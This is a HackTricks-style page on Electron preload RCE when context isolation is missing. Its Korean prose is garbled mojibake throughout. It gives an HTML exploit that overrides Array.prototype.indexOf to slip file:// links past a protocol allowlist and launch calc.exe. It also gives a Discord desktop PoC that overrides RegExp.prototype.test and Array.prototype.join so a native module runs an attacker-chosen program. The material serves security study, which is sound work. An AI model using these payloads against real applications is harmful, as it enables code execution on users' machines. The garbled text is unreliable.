# Electron contextIsolation RCEë¥¼ í†µí•œ preload ì½”ë“œ

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ìì‹ ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>

## ì˜ˆì œ 1

[https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)ì—ì„œ ê°€ì ¸ì˜¨ ì˜ˆì œì…ë‹ˆë‹¤.

ì´ ì½”ë“œëŠ” ê¸°ë³¸ ë¸Œë¼ìš°ì €ë¡œ http(s) ë§í¬ë¥¼ ì—½ë‹ˆë‹¤:

![](<../../../.gitbook/assets/image (375) (1) (1).png>)

`file:///C:/Windows/systemd32/calc.exe`ì™€ ê°™ì€ ê²ƒì„ ì‚¬ìš©í•˜ì—¬ calcë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `SAFE_PROTOCOLS.indexOf`ê°€ ì´ë¥¼ ë°©ì§€í•˜ê³  ìˆìŠµë‹ˆë‹¤.

ë”°ë¼ì„œ ê³µê²©ìëŠ” XSS ë˜ëŠ” ì„ì˜ì˜ í˜ì´ì§€ íƒìƒ‰ì„ í†µí•´ ì´ JS ì½”ë“œë¥¼ ì‚½ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
```
`SAFE_PROTOCOLS.indexOf` í˜¸ì¶œì€ í•­ìƒ 1337ì„ ë°˜í™˜í•˜ë¯€ë¡œ, ê³µê²©ìëŠ” ë³´í˜¸ ê¸°ëŠ¥ì„ ìš°íšŒí•˜ê³  calcë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìµœì¢… ìµìŠ¤í”Œë¡œì‡:
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```
ë‹¤ë¥¸ ê¶Œí•œ ìš”ì²­ í”„ë¡¬í”„íŠ¸ ì—†ì´ í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•ì€ ì›ë³¸ ìŠ¬ë¼ì´ë“œë¥¼ í™•ì¸í•˜ì‹­ì‹œì˜¤.

ì•„ë§ˆë„ ì½”ë“œë¥¼ ë¡œë“œí•˜ê³  ì‹¤í–‰í•˜ëŠ” ë˜ ë‹¤ë¥¸ ë°©ë²•ì€ `file://127.0.0.1/electron/rce.jar`ì™€ ê°™ì€ ê²ƒì— ì ‘ê·¼í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

## ì˜ˆì œ 2: Discord ì•± RCE

ì˜ˆì œ ì¶œì²˜: [https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)

preload ìŠ¤í¬ë¦½íŠ¸ë¥¼ í™•ì¸í•  ë•Œ, DiscordëŠ” ì›¹ í˜ì´ì§€ì—ì„œ `DiscordNative.nativeModules.requireModule('MODULE-NAME')`ì„ í†µí•´ ì¼ë¶€ í—ˆìš©ëœ ëª¨ë“ˆì„ í˜¸ì¶œí•  ìˆ˜ ìˆëŠ” í•¨ìˆ˜ë¥¼ ë…¸ì¶œì‹œí‚µë‹ˆë‹¤.\
ì—¬ê¸°ì„œëŠ” _child\_process_ ëª¨ë“ˆê³¼ ê°™ì´ RCEì— ì§ì ‘ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ëª¨ë“ˆì„ ì‚¬ìš©í•  ìˆ˜ ì—†ì—ˆì§€ë§Œ, **JavaScript ë‚´ì¥ ë©”ì„œë“œë¥¼ ë¬´ì‹œí•˜ê³  ë…¸ì¶œëœ ëª¨ë“ˆì˜ ì‹¤í–‰ì— ê°„ì„­í•¨ìœ¼ë¡œì¨ RCEë¥¼ ë‹¬ì„±í•  ìˆ˜ ìˆëŠ” ì½”ë“œë¥¼ ì°¾ì•˜ìŠµë‹ˆë‹¤**.

ë‹¤ìŒì€ PoCì…ë‹ˆë‹¤. **`RegExp.prototype.test`ê³¼ `Array.prototype.join`ì„ ë¬´ì‹œ**í•˜ë©´ì„œ "_discord\_utils_"ë¼ëŠ” ëª¨ë“ˆì—ì„œ ì •ì˜ëœ `getGPUDriverVersions` í•¨ìˆ˜ë¥¼ devToolsì—ì„œ í˜¸ì¶œí•˜ë©´ **calc ì• í”Œë¦¬ì¼€ì´ì…˜ì´ íŒì—…ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤**.
```javascript
RegExp.prototype.test=function(){
return false;
}
Array.prototype.join=function(){
return "calc";
}
DiscordNative.nativeModules.requireModule('discord_utils').getGPUDriverVersions();
```
`getGPUDriverVersions` í•¨ìˆ˜ëŠ” ë‹¤ìŒê³¼ ê°™ì´ "_execa_" ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•˜ì—¬ í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰í•˜ë ¤ê³  ì‹œë„í•©ë‹ˆë‹¤:
```javascript
module.exports.getGPUDriverVersions = async () => {
if (process.platform !== 'win32') {
return {};
}

const result = {};
const nvidiaSmiPath = `${process.env['ProgramW6432']}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`;

try {
result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []));
} catch (e) {
result.nvidia = {error: e.toString()};
}

return result;
};
```
ì¼ë°˜ì ìœ¼ë¡œ _execa_ëŠ” `nvidiaSmiPath` ë³€ìˆ˜ì— ì§€ì •ëœ "_nvidia-smi.exe_"ë¥¼ ì‹¤í–‰í•˜ë ¤ê³  ì‹œë„í•˜ì§€ë§Œ, `RegExp.prototype.test`ì™€ `Array.prototype.join`ì´ ë®ì–´ì“°ì—¬ì ¸ ìˆê¸° ë•Œë¬¸ì— **ì¸ìëŠ” \_execaì˜ ë‚´ë¶€ ì²˜ë¦¬ì—ì„œ "**_**calc**_**"ë¡œ ëŒ€ì²´ë©ë‹ˆë‹¤.

êµ¬ì²´ì ìœ¼ë¡œ, ë‹¤ìŒ ë‘ ë¶€ë¶„ì„ ë³€ê²½í•˜ì—¬ ì¸ìë¥¼ ëŒ€ì²´í•©ë‹ˆë‹¤.

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36)

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* ë…ì ì ì¸ [**NFT**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì¸ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
